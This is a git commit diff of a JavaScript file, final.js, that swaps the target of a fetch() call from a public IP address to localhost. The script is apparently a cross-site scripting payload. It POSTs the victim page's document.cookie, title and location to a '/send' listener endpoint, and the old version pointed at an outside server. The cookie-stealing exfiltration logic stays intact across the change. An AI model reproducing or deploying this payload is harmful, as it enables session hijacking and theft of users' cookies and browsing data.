2d8b8025d5c5578cb75f0ea661dc9fa199eb402b
payprays <112151817+paprays@users.noreply.github.com>
2024-05-02 23:49:58 +0800

    Update final.js

--- final.js
+++ final.js
@@ -1,4 +1,4 @@
-fetch("http://39.101.137.200:7745/send", {
+fetch("http://127.0.0.1:5000/send", {
   "headers": {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
     "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
@@ -8,7 +8,7 @@ fetch("http://39.101.137.200:7745/send", {
     "proxy-connection": "keep-alive",
     "upgrade-insecure-requests": "1"
   },
-  "referrer": "http://39.101.137.200:7745/send",
+  "referrer": "http://127.0.0.1:5000/send",
   "body": "header="+document.title+"&listener=ppp&content=123"+document.cookie+document.location,
   "method": "POST",
   "mode": "cors",
